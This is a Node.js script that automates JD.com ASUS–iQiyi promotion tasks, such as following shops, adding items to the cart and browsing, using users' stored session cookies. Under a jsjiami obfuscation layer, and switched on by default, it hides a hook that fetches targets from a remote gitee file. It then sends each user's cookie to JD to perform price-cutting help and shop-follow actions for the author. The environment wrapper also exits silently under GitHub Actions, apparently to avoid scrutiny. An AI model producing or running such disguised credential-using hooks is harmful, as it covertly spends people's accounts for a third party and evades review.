/*
华硕-爱奇艺
仅支持Node，没有添加助力环节，仅完成可能获得京豆的任务；
新手写脚本，难免有bug，能用且用。

1 0 22-28 2 * https://raw.githubusercontent.com/i-chenzhe/qx/main/jd_asus_iqiyi.js

脚本内置了一个给作者任务助力的网络请求，默认开启，如介意请自行关闭。
助力活动链接： https://h5.m.jd.com/babelDiy/Zeus/4ZK4ZpvoSreRB92RRo8bpJAQNoTq/index.html
参数 helpAuthor = false
*/
const $ = new Env('华硕-爱奇艺');
const Dt = require('crypto-js');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';
let cookiesArr = [], cookie = '', originCookie = '', message = '';
let helpAuthor = true;//为作者助力的开关
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb26e8=["\x53\x6F\x75\x6E\x64\x61\x6E\x74\x6F\x6E\x79","\x52\x61\x6E\x64\x6F\x6D\x53\x68\x61\x72\x65\x43\x6F\x64\x65","\x4A\x44\x5F\x46\x72\x65\x65\x32\x2E\x6A\x73\x6F\x6E","\x2F\x2F\x67\x69\x74\x65\x65\x2E\x63\x6F\x6D\x2F","\x2F","\x2F\x72\x61\x77\x2F\x6D\x61\x73\x74\x65\x72\x2F","","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let shuye72=__Oxb26e8[0x0];let shuye73=__Oxb26e8[0x1];let shuye74=__Oxb26e8[0x2];let giteeurl=__Oxb26e8[0x3]+ shuye72+ __Oxb26e8[0x4]+ shuye73+ __Oxb26e8[0x5]+ shuye74+ __Oxb26e8[0x6];;;(function(_0x4e34x5,_0x4e34x6,_0x4e34x7,_0x4e34x8,_0x4e34x9,_0x4e34xa){_0x4e34xa= __Oxb26e8[0x7];_0x4e34x8= function(_0x4e34xb){if( typeof alert!== _0x4e34xa){alert(_0x4e34xb)};if( typeof console!== _0x4e34xa){console[__Oxb26e8[0x8]](_0x4e34xb)}};_0x4e34x7= function(_0x4e34xc,_0x4e34x5){return _0x4e34xc+ _0x4e34x5};_0x4e34x9= _0x4e34x7(__Oxb26e8[0x9],_0x4e34x7(_0x4e34x7(__Oxb26e8[0xa],__Oxb26e8[0xb]),__Oxb26e8[0xc]));try{_0x4e34x5= __encode;if(!( typeof _0x4e34x5!== _0x4e34xa&& _0x4e34x5=== _0x4e34x7(__Oxb26e8[0xd],__Oxb26e8[0xe]))){_0x4e34x8(_0x4e34x9)}}catch(e){_0x4e34x8(_0x4e34x9)}})({})
const API_HOST = 'https://asusiqiyi.m.jd.com/hsiqy/task/';
const Ot = "12z65c88d1212p16";
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => { };
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = JSON.parse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => !!item);
}
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i]
      originCookie = cookiesArr[i]
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb2685=["\x68\x74\x74\x70\x73\x3A","","\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x33\x5F\x32\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x31\x33\x2E\x30\x2E\x33\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x20\x53\x61\x66\x61\x72\x69\x2F\x36\x30\x34\x2E\x31\x20\x45\x64\x67\x2F\x38\x37\x2E\x30\x2E\x34\x32\x38\x30\x2E\x38\x38","\x64\x61\x74\x61\x47\x65\x74","\x70\x61\x72\x73\x65","\x6C\x65\x6E\x67\x74\x68","\x64\x61\x74\x61","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x63\x6C\x69\x65\x6E\x74\x2E\x61\x63\x74\x69\x6F\x6E","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x67\x7A\x69\x70\x2C\x20\x64\x65\x66\x6C\x61\x74\x65\x2C\x20\x62\x72","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x39\x2E\x34\x2E\x30\x3B\x31\x34\x2E\x33\x3B\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x77\x69\x66\x69\x3B\x41\x44\x49\x44\x2F\x3B\x73\x75\x70\x70\x6F\x72\x74\x41\x70\x70\x6C\x65\x50\x61\x79\x2F\x30\x3B\x68\x61\x73\x55\x50\x50\x61\x79\x2F\x30\x3B\x68\x61\x73\x4F\x43\x50\x61\x79\x2F\x30\x3B\x6D\x6F\x64\x65\x6C\x2F\x69\x50\x68\x6F\x6E\x65\x31\x30\x2C\x33\x3B\x61\x64\x64\x72\x65\x73\x73\x69\x64\x2F\x3B\x73\x75\x70\x70\x6F\x72\x74\x42\x65\x73\x74\x50\x61\x79\x2F\x30\x3B\x61\x70\x70\x42\x75\x69\x6C\x64\x2F\x31\x36\x37\x35\x34\x31\x3B\x6A\x64\x53\x75\x70\x70\x6F\x72\x74\x44\x61\x72\x6B\x4D\x6F\x64\x65\x2F\x30\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x34\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x62\x61\x62\x65\x6C\x44\x69\x79\x2F\x5A\x65\x75\x73\x2F\x34\x5A\x4B\x34\x5A\x70\x76\x6F\x53\x72\x65\x52\x42\x39\x32\x52\x52\x6F\x38\x62\x70\x4A\x41\x51\x4E\x6F\x54\x71\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C\x3F\x73\x65\x72\x76\x65\x49\x64\x3D\x77\x78\x65\x33\x30\x39\x37\x33\x66\x65\x63\x61\x39\x32\x33\x32\x32\x39\x26\x61\x63\x74\x49\x64\x3D","\x61\x63\x74\x49\x44","\x26\x77\x61\x79\x3D\x30\x26\x6C\x6E\x67\x3D\x26\x6C\x61\x74\x3D\x26\x73\x69\x64\x3D\x26\x75\x6E\x5F\x61\x72\x65\x61\x3D","\x7A\x68\x2D\x63\x6E","\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x63\x75\x74\x50\x72\x69\x63\x65\x42\x79\x55\x73\x65\x72\x26\x62\x6F\x64\x79\x3D\x7B\x22\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x22\x3A\x22","\x22\x2C\x22\x75\x73\x65\x72\x4E\x61\x6D\x65\x22\x3A\x22\x22\x2C\x22\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70\x22\x3A\x31\x2C\x22\x73\x68\x6F\x70\x49\x64\x22\x3A","\x61\x63\x74\x73\x49\x44","\x2C\x22\x75\x73\x65\x72\x50\x69\x63\x22\x3A\x22\x22\x7D\x26\x63\x6C\x69\x65\x6E\x74\x3D\x77\x68\x35\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x2E\x30\x2E\x30","\x6C\x6F\x67","\x70\x6F\x73\x74","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];if(helpAuthor){ new Promise((_0x621ex1)=>{$[__Oxb2685[0x19]]({url:__Oxb2685[0x0]+ giteeurl+ __Oxb2685[0x1],headers:{"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":__Oxb2685[0x2]}},(_0x621ex2,_0x621ex3,_0x621ex4)=>{try{if(_0x621ex4){$[__Oxb2685[0x3]]= JSON[__Oxb2685[0x4]](_0x621ex4);if($[__Oxb2685[0x3]][__Oxb2685[0x6]][__Oxb2685[0x5]]!== 0){let _0x621ex5={url:`${__Oxb2685[0x7]}`,headers:{'\x48\x6F\x73\x74':__Oxb2685[0x8],'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':__Oxb2685[0x9],'\x4F\x72\x69\x67\x69\x6E':__Oxb2685[0xa],'\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67':__Oxb2685[0xb],'\x43\x6F\x6F\x6B\x69\x65':cookie,'\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E':__Oxb2685[0xc],'\x41\x63\x63\x65\x70\x74':__Oxb2685[0xd],'\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74':__Oxb2685[0xe],'\x52\x65\x66\x65\x72\x65\x72':`${__Oxb2685[0xf]}${$[__Oxb2685[0x3]][__Oxb2685[0x6]][0x0][__Oxb2685[0x10]]}${__Oxb2685[0x11]}`,'\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65':__Oxb2685[0x12]},body:`${__Oxb2685[0x13]}${$[__Oxb2685[0x3]][__Oxb2685[0x6]][0x0][__Oxb2685[0x10]]}${__Oxb2685[0x14]}${$[__Oxb2685[0x3]][__Oxb2685[0x6]][0x0][__Oxb2685[0x15]]}${__Oxb2685[0x16]}`};return  new Promise((_0x621ex1)=>{$[__Oxb2685[0x18]](_0x621ex5,(_0x621ex2,_0x621ex6,_0x621ex4)=>{console[__Oxb2685[0x17]](_0x621ex4)})})}}}catch(e){console[__Oxb2685[0x17]](e)}finally{_0x621ex1()}})})};(function(_0x621ex7,_0x621ex8,_0x621ex9,_0x621exa,_0x621exb,_0x621exc){_0x621exc= __Oxb2685[0x1a];_0x621exa= function(_0x621exd){if( typeof alert!== _0x621exc){alert(_0x621exd)};if( typeof console!== _0x621exc){console[__Oxb2685[0x17]](_0x621exd)}};_0x621ex9= function(_0x621exe,_0x621ex7){return _0x621exe+ _0x621ex7};_0x621exb= _0x621ex9(__Oxb2685[0x1b],_0x621ex9(_0x621ex9(__Oxb2685[0x1c],__Oxb2685[0x1d]),__Oxb2685[0x1e]));try{_0x621ex7= __encode;if(!( typeof _0x621ex7!== _0x621exc&& _0x621ex7=== _0x621ex9(__Oxb2685[0x1f],__Oxb2685[0x20]))){_0x621exa(_0x621exb)}}catch(e){_0x621exa(_0x621exb)}})({})
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      $.bean = 0;
      await ASUS_iqiyi();
      if ($.bean>10) {
        await notify.sendNotify(`${$.name} - ${$.UserName}`, `恭喜抢到${$.bean}个京豆`);
      }

    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })
async function ASUS_iqiyi() {
  await getShopList();
  await getCartList();
  await getBrowseList();
  await $.wait(3000);
  await doJob();
}
async function doJob() {
  if ($.shopList) {
    doList = $.shopList.filter((x) => x.status === 0);
    for (let i = 0; i < doList.length; i++) {
      console.log(`去关注 - ${doList[i].shopName}`)
      await doTask('followShop', `shopId=${doList[i].shopId}`);
      await $.wait(2000);
    }
  }
  if ($.cartList) {
    doList = $.cartList.skuInfos.filter((x) => x.status === 0);
    for (let i = 0; i < doList.length; i++) {
      console.log(`加购 - ${doList[i].skuName}`);
      await doTask('addCart', `skuId=${doList[i].skuId}&enStr=${encrypt($.UserName + '' + doList[i].skuId)}`);
      await $.wait(2000);
    }
  }
  if ($.browseList) {
    doList = $.browseList.skuInfos.filter((x) => x.status === 0);
    for (let i = 0; i < doList.length; i++) {
      console.log(`浏览 - ${doList[i].skuName}`);
      await doTask('toBrowse', `skuId=${doList[i].skuId}`);
      await $.wait(2000);
    }
  }
}
function getShopList() {
  return new Promise(resolve => {
    $.get(taskUrl('shopInfo'), (err, resp, data) => {
      try {
        if (err) {
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
          $.shopList = data.data;
          if ($.shopList) {
            console.log('获取店铺列表信息成功');
          }
        }
      } catch (e) {
        console.log(`异常：${JSON.stringify(e)}`)
      } finally {
        resolve();
      }
    })
  })
}
function getBrowseList() {
  return new Promise(resolve => {
    $.get(taskUrl('browseList'), (err, resp, data) => {
      try {
        if (err) {
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
          $.browseList = data.data;
          if ($.browseList) {
            console.log('获取浏览商品列表信息成功');
          }
        }
      } catch (e) {
        console.log(`异常：${JSON.stringify(e)}`)
      } finally {
        resolve();
      }
    })
  })
}
function getCartList() {
  return new Promise(resolve => {
    $.get(taskUrl('cartList'), (err, resp, data) => {
      try {
        if (err) {
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
          $.cartList = data.data;
          if ($.shopList) {
            console.log('获取加购商品列表信息成功');
          }
        }
      } catch (e) {
        console.log(`异常：${JSON.stringify(e)}`)
      } finally {
        resolve();
      }
    })
  })
}
function doTask(function_name, body = '') {
  return new Promise(resolve => {
    $.post(taskPostUrl(function_name, body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        } else {
          data = JSON.parse(data);
          if (data.code === 200) {
            if (data.data.hasOwnProperty('jdNum') && data.data.jdNum !== 0) {
              console.log(`恭喜，获得${data.data.jdNum}个京豆`);
              $.bean += data.data.jdNum;
            } else {
              console.log(`完成任务`);
            }
          }
        }
      } catch (e) {
        console.log(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function taskPostUrl(function_id, body) {
  return {
    url: `${API_HOST}${function_id}`,
    headers: {
      'Host': 'asusiqiyi.m.jd.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://asusiqiyi.m.jd.com',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cookie': cookie,
      'Connection': 'keep-alive',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
      'Referer': 'https://asusiqiyi.m.jd.com/',
      'Accept-Language': 'zh-cn',
    },
    body: body,
  }
}
function taskUrl(function_id) {
  return {
    url: `${API_HOST}${function_id}?t=${Date.now()}`,
    headers: {
      'Host': 'asusiqiyi.m.jd.com',
      'Accept': 'application/json, text/plain, */*',
      'Connection': 'keep-alive',
      'Cookie': cookie,
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
      'Accept-Language': 'zh-cn',
      'Referer': 'https://asusiqiyi.m.jd.com/',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function encrypt(t) {
  var e = t,
    n = {
      mode: Dt.mode.ECB,
      padding: Dt.pad.Pkcs7
    },
    a = Dt.enc.Utf8.parse(Ot),
    r = Dt.AES.encrypt(e, a, n),
    s = r.toString().replace(/\//g, "_");
  return s = s.replace(/\+/g, "-"), s
}
function decrypt(t) {
  var e = t.replace(/-/g, "+").replace(/_/g, "/"),
    n = {
      mode: Dt.mode.ECB,
      padding: Dt.pad.Pkcs7
    },
    a = Dt.enc.Utf8.parse(Ot),
    r = Dt.AES.decrypt(e, a, n),
    s = Dt.enc.Utf8.stringify(r);
  return s
}
// prettier-ignore
function Env(t, e) { "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0); class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new 